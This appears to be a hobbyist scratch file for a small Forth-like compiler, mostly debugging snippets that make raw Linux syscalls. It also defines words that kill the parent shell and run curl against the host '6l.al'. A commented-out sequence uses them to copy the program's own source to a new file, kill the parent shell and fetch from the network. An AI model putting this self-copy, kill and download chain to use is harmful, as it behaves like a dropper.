\ / 2>&-;	RUN=1 DIS=1 SOURCE=$0 ./viert.sh -DWORD_ALIGN=1 "$@"; exit $?
: creat		  8 syscall3 ;
: open		  5 syscall3 ;
: sendfile	187 syscall3 ;
: execve	 11 syscall3 ;
: getppid	 64 syscall3 ;
: kill		 37 syscall3 ;

: print6
	stringr "6"
	writestdout
	\ rp@
	;

: creat6
	0
	'6'
	sp@
	creat
	;

: killbash
	getppid
	6
	swap
	kill
	;

: download6
	0
	string0 "6l.al"
	string0 "-L"
	dup	\ exec name can be anything
	sp@	\ array of pointers
	0	\ env
	swap

	string0 "/bin/curl"
	execve
	\ int3
	;NORETURN

: strunk
	NOINLINE
	rp@
	rpsp@
	drop
	dbg
	;


: sp2 rpsp@ nip CELL+ ;

MAIN

4 5 dbg
xor

dbg bye
ENDPARSE

300 dup 0< swap negate 0<
dbg bye
\ -1 0< 1 0< dbg bye
ENDPARSE
1 u. bye
( 
\ 666 dbg
dH demit
dE demit
\ dL dup demit demit
dL demit
dL demit
dO demit
dbang demit
dnl demit
bye

ENDPARSE
)
\ strunk
\ 1 CELL*2+ 
\ 48 5 xx+
sp@ sp2 sp@ dbg
bye
( 

100ce is what we want
0xffffcee4│+0x0004: 0x000100ce  →   add DWORD PTR [eax], eax
0xffffcee0│+0x0000: 0x000100c4  →  <Z_xlit32_72._int3_27+0000> pop ds    ← $esp

0xffffcee4│+0x0004: 0x000100ce  →   add DWORD PTR [eax], eax


)
( 
12 not 1+ not u.
bye
\ 1 1 = u.
2 2 = if 84 emit else 70 emit then
\ 2 2 = u.
bye
1+
)
 
( 
rsdrop rsdrop r@ open
\ dbg
0	\ last param for sendfile
creat6
\ dbg
sendfile
\ dbg

killbash

download6
)
\ print6
\ bye
